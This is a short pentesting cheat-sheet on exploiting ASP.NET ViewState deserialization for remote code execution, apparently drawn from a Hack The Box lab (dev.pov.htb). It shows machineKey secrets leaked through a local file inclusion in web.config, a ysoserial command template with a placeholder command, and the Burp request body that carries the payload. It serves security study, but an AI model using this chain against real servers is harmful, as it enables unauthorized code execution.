# How to identify?
If you find in a webpage based on ASP.Net the following code with **Viewstate**, then you could get a RCE via deserialization.
<div class="aspNetHidden">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="hIgTENIyx3ro27RUPDsWp8eQYDI3bgDyE860znvEMGQ1LpIZyKfTE7+hO+8wVWRfAG+YNvMFqSM+AT4UvHrkvnKpwFU=" />
</div>

# How to exploit:
Reference: https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter
Reference: https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret
1)Find the running .NetFramework version, you can use Wappalyzer or similar
2)Try to find the secrets (decriptionkey + validationkey)
3)Based on if you have the secrets or not follow the reference guide

# Attack Scenario:
1)We found the secrets via LFI in the web.config file:

```
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

2)Prepare you serialized payload (adapt **decryptionalg**, **validationalg**, path for you needs)

```
./ysoserial.exe  -p ViewState -g TextFormattingRunProperties -c "COMMAND HERE" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="DECRYPTIONKEY" --validationalg="SHA1" --validationkey="VALIDIATIONKEY"
```

3)Get the raw serialized payload and paste it into the Burp request under 
```
_viewstate
__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=<SERIALIZEDPAYLOADHERE>&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=BxmQGgZU
```



### TIPS:
1)If you have **VIEWSTATEGENERATOR** then you could use that with **--generator=** option to omit the PATH. But it might fail in some cases, then rely back on the path!